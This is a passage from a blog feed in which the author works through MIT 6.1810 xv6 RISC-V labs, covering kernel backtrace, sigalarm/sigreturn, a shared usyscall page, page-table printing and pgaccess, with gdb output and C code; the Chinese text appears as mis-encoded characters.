0x0000000080009030</span><br><span class="line">0x3fffff9fb0:   0x0000003fffff9fe0      0x000000008000201c</span><br><span class="line">0x3fffff9fc0:   0x0000000000000063      0x0000000080009030</span><br><span class="line">0x3fffff9fd0:   0x0000003fffffa000      0x0000000080001d12</span><br><span class="line">0x3fffff9fe0:   0x0000000000000063      0x0000000000014f50</span><br><span class="line">0x3fffff9ff0:   0x0000000000003fd0      0x0000000000000012</span><br><span class="line">0x3fffffa000:   Cannot access memory at address 0x3fffffa000</span><br></pre></td></tr></table></figure><p>ä½†æ˜¯åœ¨ç”¨æˆ·æ ˆä¸­ï¼Œæœ€åä¸€ä¸ªæ ˆå¸§æŒ‡é’ˆæ˜¯é¡µé¢çš„é¦–åœ°å€ - 0x10ï¼Œå°±å¾ˆæ€ªã€‚ã€‚ã€‚</p><p>æ¯”å¦‚åœ¨ sh æ‰“å° <code>$ </code> æ—¶ï¼ŒæŸ¥çœ‹ç”¨æˆ·æ ˆï¼Œ0x4fd0 -&gt; 0x4fe0 -&gt; 0x4ff0ï¼Œæœ€åä¸€ä¸ªæŒ‡é’ˆæ˜¯ 0x4ff0</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">(gdb) x/20gx <span class="variable">$fp</span>-0x10</span><br><span class="line">0x4f80: 0x0000000000004fd0      0x0000000000000ade</span><br><span class="line">0x4f90: 0x0000000000000000      0x0505050505050505</span><br><span class="line">0x4fa0: 0x0505050505050505      0x0505050505050505</span><br><span class="line">0x4fb0: 0x00000000000008a8      0x0000000000000000</span><br><span class="line">0x4fc0: 0x0000000000004fe0      0x0000000000000b66</span><br><span class="line">0x4fd0: 0x0000000000003fd0      0x00000000000000de</span><br><span class="line">0x4fe0: 0x0000000000004ff0      0x0000000000000000</span><br><span class="line">0x4ff0: 0x0000000000006873      0x0000000000000000</span><br><span class="line">0x5000: Cannot access memory at address 0x5000</span><br></pre></td></tr></table></figure><p><del>ç®—äº†ï¼Œä¸ç®¡è¿™ä¹ˆå¤šäº†ï¼Œåæ­£ä¹Ÿåªç”¨å›æº¯å†…æ ¸æ ˆ</del></p><p>æŠŠ <code>backtrace</code> è´´åˆ° kernel/printf.c ä¸­ï¼Œåœ¨ kernel/defs.h ä¸­æ·»åŠ å£°æ˜ï¼Œç„¶ååœ¨ <code>sys_sleep</code> è°ƒç”¨å°±å¥½äº†</p><figure class="highlight c"><figcaption><span>kernel/printf.c</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line"><span class="title function_">backtrace</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;backtrace:\n&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span>(uint64 fp = r_fp(); fp != PGROUNDUP(fp); fp = *(uint64*)(fp<span class="number">-0x10</span>))&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%p\n&quot;</span>, *(uint64*)(fp<span class="number">-0x8</span>));</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è·å¾—çš„åœ°å€å¯ä»¥é€šè¿‡ addr2line å¾—åˆ°å¯¹åº”çš„ç¨‹åºä»£ç çš„ä½ç½®ï¼Œä¾¿äºè°ƒè¯•</p><p>å¦‚ <code>addr2line -e kernel/kernel</code></p><p>æ”¾åˆ° <code>panic</code> å‡½æ•°ä¸­ï¼Œå¯ä»¥æ›´å¥½åœ°æ–¹ä¾¿å†…æ ¸å´©æºƒåŸå› </p><h2 id="Alarm"><a href="#Alarm" class="headerlink" title="Alarm"></a>Alarm</h2><p>æ·»åŠ ä¸€ä¸ªç”¨æˆ·çº§çš„å®šæ—¶å™¨ä¸­æ–­ï¼Œä¹Ÿå°±æ˜¯ <code>sigalarm(interval, handler)</code> å’Œ <code>sigreturn()</code></p><p>æ¯ n æ¬¡ç¡¬ä»¶è®¡æ—¶å™¨ä¸­æ–­ï¼Œå°±ä¼šè°ƒç”¨ä¸€æ¬¡ handlerï¼Œåœ¨ handler ä¸­è¦æœ‰ <code>sigreturn</code> ä¿è¯è¿˜åŸåˆ°åŸæœ¬çš„çŠ¶æ€</p><p>ç¬”è€…å¤©çœŸåœ°ä»¥ä¸ºä¿å­˜ p-&gt;trapframe-&gt;epc å°±è¡Œäº†ï¼Œwsfwï¼ˆè¿˜æœ‰é€šç”¨å¯„å­˜å™¨è¦è¿›è¡Œä¿å­˜ï¼‰</p><h3 id="åœ¨-proc-ç»“æ„ä½“æ·»åŠ å˜é‡"><a href="#åœ¨-proc-ç»“æ„ä½“æ·»åŠ å˜é‡" class="headerlink" title="åœ¨ proc ç»“æ„ä½“æ·»åŠ å˜é‡"></a>åœ¨ proc ç»“æ„ä½“æ·»åŠ å˜é‡</h3><figure class="highlight c"><figcaption><span>kernel/proc.h</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">proc</span> &#123;</span></span><br><span class="line"></span><br><span class="line">  ...</span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> ticks;</span><br><span class="line">  <span class="type">int</span> alarm_interval;</span><br><span class="line">  uint64 alarm_handler;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">trapframe</span> *<span class="title">alarm_state</span>;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>ticks<ul><li>ä¿å­˜è®¡æ—¶å™¨ä¸­æ–­æ¬¡æ•°ï¼Œæ¯ä¸­æ–­ä¸€æ¬¡ï¼Œticks++</li></ul></li><li>alarm_state<ul><li>ç›´æ¥ç”¨ <code>struct trapframe</code> ç»“æ„ä½“ä¿å­˜åŸçŠ¶æ€ï¼ˆç¬”è€…æ˜¯ä¸ªæ‡’äºº</li><li>åœ¨æ¯æ¬¡è°ƒç”¨ handler å‰ï¼Œå°†å…¶æŒ‡å‘ p-&gt;trapframe + 1ï¼Œ<code>sigreturn</code> åç½®é›¶</li></ul></li></ul><h3 id="åˆå§‹åŒ–"><a href="#åˆå§‹åŒ–" class="headerlink" title="åˆå§‹åŒ–"></a>åˆå§‹åŒ–</h3><figure class="highlight c"><figcaption><span>kernel/proc.c</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">struct</span> proc*</span><br><span class="line"><span class="title function_">allocproc</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">  ...</span><br><span class="line"></span><br><span class="line">  p-&gt;ticks = <span class="number">0</span>;</span><br><span class="line">  p-&gt;alarm_interval = <span class="number">0</span>;</span><br><span class="line">  p-&gt;alarm_handler = <span class="number">0</span>;</span><br><span class="line">  p-&gt;alarm_state = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> p;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="æ·»åŠ ç³»ç»Ÿè°ƒç”¨"><a href="#æ·»åŠ ç³»ç»Ÿè°ƒç”¨" class="headerlink" title="æ·»åŠ ç³»ç»Ÿè°ƒç”¨"></a>æ·»åŠ ç³»ç»Ÿè°ƒç”¨</h3><figure class="highlight c"><figcaption><span>kernel/sysproc.h</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">uint64</span><br><span class="line"><span class="title function_">sys_sigalarm</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> ticks;</span><br><span class="line">  uint64 handler;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">proc</span> *<span class="title">p</span> =</span> myproc();</span><br><span class="line"></span><br><span class="line">  argint(<span class="number">0</span>, &amp;ticks);</span><br><span class="line">  argaddr(<span class="number">1</span>, &amp;handler);</span><br><span class="line"></span><br><span class="line">  p-&gt;alarm_interval = ticks;</span><br><span class="line">  p-&gt;alarm_handler = handler;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">uint64</span><br><span class="line"><span class="title function_">sys_sigreturn</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">proc</span> *<span class="title">p</span> =</span> myproc();</span><br><span class="line">  uint64 a0 = p-&gt;alarm_state-&gt;a0;</span><br><span class="line"></span><br><span class="line">  memmove(p-&gt;trapframe, p-&gt;alarm_state, <span class="keyword">sizeof</span>(<span class="keyword">struct</span> trapframe));</span><br><span class="line">  <span class="built_in">memset</span>(p-&gt;alarm_state, <span class="number">0</span>, <span class="keyword">sizeof</span>(<span class="keyword">struct</span> trapframe));</span><br><span class="line">  p-&gt;alarm_state = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> a0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="è®¡æ—¶å™¨ä¸­æ–­æ—¶åˆ¤æ–­æ˜¯å¦æ‰§è¡Œ-handler"><a href="#è®¡æ—¶å™¨ä¸­æ–­æ—¶åˆ¤æ–­æ˜¯å¦æ‰§è¡Œ-handler" class="headerlink" title="è®¡æ—¶å™¨ä¸­æ–­æ—¶åˆ¤æ–­æ˜¯å¦æ‰§è¡Œ handler"></a>è®¡æ—¶å™¨ä¸­æ–­æ—¶åˆ¤æ–­æ˜¯å¦æ‰§è¡Œ handler</h3><figure class="highlight c"><figcaption><span>kernel/trap.c</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line"><span class="title function_">usertrap</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">  ...</span><br><span class="line"></span><br><span class="line">  <span class="comment">// give up the CPU if this is a timer interrupt.</span></span><br><span class="line">  <span class="keyword">if</span>(which_dev == <span class="number">2</span>) &#123;</span><br><span class="line">    yield();</span><br><span class="line">    p-&gt;ticks++;</span><br><span class="line">    <span class="keyword">if</span>(p-&gt;alarm_interval &amp;&amp; !p-&gt;alarm_state &amp;&amp; p-&gt;ticks % p-&gt;alarm_interval == <span class="number">0</span>) &#123;</span><br><span class="line">      p-&gt;alarm_state = p-&gt;trapframe + <span class="number">1</span>;</span><br><span class="line">      memmove(p-&gt;alarm_state, p-&gt;trapframe, <span class="keyword">sizeof</span>(<span class="keyword">struct</span> trapframe));</span><br><span class="line">      p-&gt;trapframe-&gt;epc = p-&gt;alarm_handler;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æœ€åæ·»åŠ ä¸€äº›å£°æ˜å³å¯</p><h2 id="Option-challenge-exercises"><a href="#Option-challenge-exercises" class="headerlink" title="Option challenge exercises"></a>Option challenge exercises</h2><h3 id="backtrace-æ‰“å°å‡½æ•°åå’Œè¡Œå·"><a href="#backtrace-æ‰“å°å‡½æ•°åå’Œè¡Œå·" class="headerlink" title="backtrace æ‰“å°å‡½æ•°åå’Œè¡Œå·"></a>backtrace æ‰“å°å‡½æ•°åå’Œè¡Œå·</h3><p>#todo</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;å¼€å­¦ï¼&lt;/p&gt;</summary>
    
    
    
    <category term="Course" scheme="https://humoooor.cn/categories/Course/"/>
    
    <category term="MIT 6.1810 2022Fall" scheme="https://humoooor.cn/categories/Course/MIT-6-1810-2022Fall/"/>
    
    
    <category term="Operating System" scheme="https://humoooor.cn/tags/Operating-System/"/>
    
    <category term="RISC-V" scheme="https://humoooor.cn/tags/RISC-V/"/>
    
    <category term="Xv6" scheme="https://humoooor.cn/tags/Xv6/"/>
    
  </entry>
  
  <entry>
    <title>Lab3 Page Tables</title>
    <link href="https://humoooor.cn/2022/10/23/Lab3_Page_tables/"/>
    <id>https://humoooor.cn/2022/10/23/Lab3_Page_tables/</id>
    <published>2022-10-23T08:56:00.000Z</published>
    <updated>2023-05-23T03:22:39.224Z</updated>
    
    <content type="html"><![CDATA[<p>å¼€å­¦ï¼</p><span id="more"></span><h2 id="git"><a href="#git" class="headerlink" title="git"></a>git</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git fetch</span><br><span class="line">git checkout pgtbl</span><br><span class="line">make clean</span><br></pre></td></tr></table></figure><h2 id="Speed-up-system-calls"><a href="#Speed-up-system-calls" class="headerlink" title="Speed up system calls"></a>Speed up system calls</h2><p>ä¸ºäº†ä¼˜åŒ– <code>getpid</code> ç³»ç»Ÿè°ƒç”¨ï¼Œä¸ç”¨æ¯æ¬¡è¿›å…¥å†…æ ¸æ€è·å– PIDï¼Œåˆ›å»ºä¸€ä¸ªç”¨æˆ·å¯è¯»çš„é¡µï¼Œå°† USYSCALL æ˜ å°„åˆ°è¯¥é¡µä¸Š</p><p>å¯ä»¥è§‚å¯Ÿ <code>ugetpid</code> å‡½æ•°çš„å®šä¹‰ï¼Œå®ƒç›´æ¥è®¿é—® USYSCALL å³å¯æ‹¿åˆ° pidï¼Œä¸éœ€è¦ç³»ç»Ÿè°ƒç”¨ï¼Œç®—æ˜¯ä»¥ç©ºé—´æ¢æ—¶é—´</p><figure class="highlight c"><figcaption><span>user/ulib.c</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line"><span class="title function_">ugetpid</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">usyscall</span> *<span class="title">u</span> =</span> (<span class="keyword">struct</span> usyscall *)USYSCALL;</span><br><span class="line">  <span class="keyword">return</span> u-&gt;pid;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol><li>åœ¨ <code>kernel/proc.h</code> ä¸­ proc ç»“æ„ä½“åŠ å…¥ <code>struct usyscall *usyscall</code></li><li>åœ¨ <code>allocproc</code> åˆå§‹åŒ– usyscall</li></ol><figure class="highlight c"><figcaption><span>kernel/proc.c</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">struct</span> proc* <span class="title function_">allocproc</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">  ...</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>((p-&gt;usyscall = (<span class="keyword">struct</span> usyscall *)kalloc()) == <span class="number">0</span>)&#123;</span><br><span class="line">    freeproc(p);</span><br><span class="line">    release(&amp;p-&gt;lock);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  p-&gt;usyscall-&gt;pid = p-&gt;pid;</span><br><span class="line"></span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="3"><li>åœ¨ <code>proc_pagetable</code> å»ºç«‹æ˜ å°„</li></ol><figure class="highlight c"><figcaption><span>kernel/proc.c</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">pagetable_t</span> <span class="title function_">proc_pagetable</span><span class="params">(<span class="keyword">struct</span> proc *p)</span></span><br><span class="line">&#123;</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(mappages(pagetable, USYSCALL, PGSIZE,</span><br><span class="line">            (uint64)(p-&gt;usyscall), PTE_R | PTE_U) &lt; <span class="number">0</span>)&#123;</span><br><span class="line">    uvmunmap(pagetable, TRAPFRAME, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">    uvmunmap(pagetable, TRAMPOLINE, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">    uvmfree(pagetable, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="4"><li>åœ¨ <code>freeproc</code> é‡Šæ”¾ usyscall</li></ol><figure class="highlight c"><figcaption><span>kernel/proc.c</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">freeproc</span><span class="params">(<span class="keyword">struct</span> proc *p)</span></span><br><span class="line">&#123;</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(p-&gt;usyscall)</span><br><span class="line">    kfree((<span class="type">void</span>*)p-&gt;usyscall);</span><br><span class="line">  p-&gt;usyscall = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="5"><li>åœ¨ <code>proc_freepagetable</code> å–æ¶ˆé¡µé¢æ˜ å°„ï¼ˆè¿™é‡Œå®éªŒæ–‡æ¡£æ²¡è¯´ï¼Œè¦è‡ªå·±å‘ç°åœ¨ <code>freeproc</code> å‡½æ•°ä¸­è°ƒç”¨äº†è¿™ä¸ªå‡½æ•°ï¼‰</li></ol><figure class="highlight c"><figcaption><span>kernel/proc.c</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line"><span class="title function_">proc_freepagetable</span><span class="params">(<span class="type">pagetable_t</span> pagetable, uint64 sz)</span></span><br><span class="line">&#123;</span><br><span class="line">  uvmunmap(pagetable, TRAMPOLINE, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">  uvmunmap(pagetable, TRAPFRAME, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">  uvmunmap(pagetable, USYSCALL, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">  uvmfree(pagetable, sz);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æé—®ï¼šè¿˜æœ‰ä»€ä¹ˆå…¶ä»–çš„ç³»ç»Ÿè°ƒç”¨å¯ä»¥é€šè¿‡è¿™æ ·çš„å…±äº«é¡µæ¥åŠ å¿«é€Ÿåº¦ï¼Ÿ</p><p>æ€ä¹ˆæ„Ÿè§‰æ²¡æœ‰äº†</p><h2 id="Print-a-page-table"><a href="#Print-a-page-table" class="headerlink" title="Print a page table"></a>Print a page table</h2><p>xv6 ä½¿ç”¨ä¸‰çº§é¡µè¡¨ï¼Œåœ¨è¿è¡Œç¬¬ä¸€ä¸ªç”¨æˆ·è¿›ç¨‹æ—¶æ‰“å°å‡ºå…¶é¡µè¡¨</p><p>è¿™é‡Œä½¿ç”¨ä¸€ä¸ªé™æ€å˜é‡ level è¡¨ç¤ºåœ¨ç¬¬å‡ çº§é¡µè¡¨</p><figure class="highlight c"><figcaption><span>kernel/vm.c</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line"><span class="title function_">pteprint</span><span class="params">(<span class="type">pagetable_t</span> pagetable, <span class="type">int</span> level)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">512</span>; i++) &#123;</span><br><span class="line">    <span class="type">pte_t</span> pte = pagetable[i];</span><br><span class="line">    <span class="keyword">if</span>(pte &amp; PTE_V) &#123;</span><br><span class="line">      uint64 child = PTE2PA(pte);</span><br><span class="line">      <span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>; j &lt; level; j++)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot; ..&quot;</span>);</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;%d: pte %p pa %p\n&quot;</span>, i, pte, child);</span><br><span class="line">      <span class="keyword">if</span>((pte &amp; (PTE_R | PTE_W | PTE_X)) == <span class="number">0</span>)</span><br><span class="line">        pteprint((<span class="type">pagetable_t</span>)child, level+<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span></span><br><span class="line"><span class="title function_">vmprint</span><span class="params">(<span class="type">pagetable_t</span> pagetable)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;page table %p\n&quot;</span>, pagetable);</span><br><span class="line">  pteprint(pagetable, <span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç¬”è€…ä¹‹å‰ä½¿ç”¨å±€éƒ¨é™æ€å˜é‡æ¥åˆ¤æ–­ levelï¼Œä½†æ˜¯æƒ³ç€å¦‚æœæ˜¯å¤šçº¿ç¨‹çš„è¯æ²¡æœ‰åŠ é”å¯èƒ½ä¼šå‡ºé—®é¢˜</p><p>ç„¶ååœ¨ defs.h å’Œ exec.c ä¸­æ·»åŠ å£°æ˜å’Œä½¿ç”¨å°±è¡Œ</p><h2 id="Detect-which-pages-have-been-accessed"><a href="#Detect-which-pages-have-been-accessed" class="headerlink" title="Detect which pages have been accessed"></a>Detect which pages have been accessed</h2><p>RISC-V ç¡¬ä»¶ä¼šåœ¨ TLB å‘½ä¸­å¤±è´¥æ—¶ï¼Œå°†å¯¹åº” PTE çš„ Access æ ‡å¿—ä½è®¾ 1ï¼Œç”¨æ¥è®°å½•è¯¥é¡µé¢æœ‰æ²¡æœ‰è®¿é—®è¿‡</p><p>å†™ä¸€ä¸ªç³»ç»Ÿè°ƒç”¨ï¼Œä¸‰ä¸ªå‚æ•°ï¼Œæ£€æµ‹çš„åœ°å€ï¼Œæ£€æµ‹çš„é¡µæ•°ï¼Œbitmask</p><p>æŒºç®€å•çš„ï¼Œä¸çŸ¥é“ä¸ºä»€ä¹ˆå®éªŒéš¾åº¦å†™ç€ hard</p><figure class="highlight c"><figcaption><span>kernel/sysproc.c</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> PTE_A (1L &lt;&lt; 6)</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span></span><br><span class="line"><span class="title function_">sys_pgaccess</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123; </span><br><span class="line">  uint64 base;</span><br><span class="line">  uint64 mask;</span><br><span class="line">  <span class="type">int</span> len;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> abits;</span><br><span class="line"></span><br><span class="line">  argaddr(<span class="number">0</span>, &amp;base);</span><br><span class="line">  argint(<span class="number">1</span>, &amp;len);</span><br><span class="line">  <span class="keyword">if</span>(len &gt; <span class="number">32</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  argaddr(<span class="number">2</span>, &amp;mask);</span><br><span class="line"></span><br><span class="line">  abits = <span class="number">0</span>;</span><br><span class="line">  <span class="type">pagetable_t</span> pagetable = myproc()-&gt;pagetable;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line">    <span class="type">pte_t</span> *pte = walk(pagetable, base + PGSIZE * i, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span>(pte == <span class="number">0</span>)</span><br><span class="line">      <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(*pte &amp; PTE_A) &#123;</span><br><span class="line">      abits |= <span class="number">1</span> &lt;&lt; i;</span><br><span class="line">      *pte &amp;= ~PTE_A;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(copyout(pagetable, mask, (<span class="type">char</span>*)&amp;abits, <span class="keyword">sizeof</span>(abits)) &lt; <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;``</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ³¨æ„æ£€æµ‹å®Œåï¼Œå°†æ ‡è®°ç½®é›¶ï¼Œä¸ç„¶ä¸çŸ¥é“æ£€æµ‹åè¿˜æ²¡æœ‰è®¿é—®è¿‡</p><h2 id="Optional-challenge-exercises"><a href="#Optional-challenge-exercises" class="headerlink" title="Optional challenge exercises"></a>Optional challenge exercises</h2><h3 id="ä½¿ç”¨-super-pages-å‡å°‘é¡µè¡¨ä¸­-PTE-çš„æ•°é‡"><a href="#ä½¿ç”¨-super-pages-å‡å°‘é¡µè¡¨ä¸­-PTE-çš„æ•°é‡" class="headerlink" title="ä½¿ç”¨ super-pages å‡å°‘é¡µè¡¨ä¸­ PTE çš„æ•°é‡"></a>ä½¿ç”¨ super-pages å‡å°‘é¡µè¡¨ä¸­ PTE çš„æ•°é‡</h3><p>ä¸æ˜¯å¾ˆæ‡‚ï¼Œæ”¹ç”¨æ›´å¤§çš„é¡µï¼ˆï¼Ÿï¼‰</p><h3 id="å–æ¶ˆç”¨æˆ·è¿›ç¨‹çš„ç¬¬ä¸€é¡µçš„æ˜ å°„ï¼Œ"><a href="#å–æ¶ˆç”¨æˆ·è¿›ç¨‹çš„ç¬¬ä¸€é¡µçš„æ˜ å°„ï¼Œ" class="headerlink" title="å–æ¶ˆç”¨æˆ·è¿›ç¨‹çš„ç¬¬ä¸€é¡µçš„æ˜ 